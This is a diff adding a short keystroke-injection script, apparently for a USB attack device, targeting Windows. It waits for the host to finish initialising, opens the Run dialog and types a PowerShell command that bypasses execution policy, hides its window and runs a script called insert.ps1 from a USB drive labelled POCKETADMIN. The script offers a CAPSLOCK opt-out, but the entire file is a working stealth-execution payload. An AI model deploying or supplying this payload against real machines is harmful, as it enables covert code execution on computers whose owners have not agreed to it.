@@ -1,0 +1,13 @@
+REM --- target: windows ---
+REM --- wait unitl host has done all its initializations ---
+WAITFOR_INIT
+
+REM --- allow user to prevent payload execution by tapping CAPSLOCK during insertion ---
+ALLOW_EXIT
+
+REM --- find appropriate USB drive (FAT label must be POCKETADMIN) ---
+REM --- execute powershell script contained in /scripts/insert.ps1 file ---
+GUI r
+DELAY 100
+STRING powershell -exec bypass -noP -wind hidden -nonI ".((Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter+':\scripts\insert.ps1')"
+ENTER
